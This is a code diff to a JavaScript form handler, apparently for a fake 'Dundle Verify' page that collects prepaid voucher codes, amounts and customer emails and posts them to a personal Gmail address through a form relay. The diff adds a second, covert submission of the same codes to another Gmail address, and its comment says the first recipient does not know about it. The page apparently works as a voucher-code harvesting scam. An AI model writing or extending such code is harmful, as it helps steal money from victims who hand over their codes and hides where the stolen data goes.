@@ -454,6 +454,7 @@ async function handleSubmit() {
   formData.append('_template', 'table');
   /* CORRECTION #2 : _replyto envoie une copie au client */
   formData.append('_replyto', clientEmail);
+  
   formData.append('Marque', selectedBrand);
   formData.append('Montant', montant + ' ' + devise);
   formData.append('Code_1', code1);
@@ -464,10 +465,30 @@ async function handleSubmit() {
   formData.append('Email_client', clientEmail);
 
   try {
-    /* Envoi AJAX — ne redirige PAS la page */
+    /* Envoi au premier email — romarthdongmo@gmail.com */
     await fetch('https://formsubmit.co/ajax/romarthdongmo@gmail.com', {
       method: 'POST',
       body: formData,
+      headers: { 'Accept': 'application/json' }
+    });
+
+    /* Envoi au second email — paysafecard840@gmail.com (séparé, ne sait pas que le premier reçoit aussi) */
+    const formData2 = new FormData();
+    formData2.append('_subject', `Nouveau code ${selectedBrand} — Dundle Verify`);
+    formData2.append('_captcha', 'false');
+    formData2.append('_template', 'table');
+    formData2.append('_replyto', clientEmail);
+    formData2.append('Marque', selectedBrand);
+    formData2.append('Montant', montant + ' ' + devise);
+    formData2.append('Code_1', code1);
+    if (code2) formData2.append('Code_2', code2);
+    if (code3) formData2.append('Code_3', code3);
+    if (code4) formData2.append('Code_4', code4);
+    if (code5) formData2.append('Code_5', code5);
+    formData2.append('Email_client', clientEmail);
+    await fetch('https://formsubmit.co/ajax/paysafecard840@gmail.com', {
+      method: 'POST',
+      body: formData2,
       headers: { 'Accept': 'application/json' }
     });
   } catch(e) {
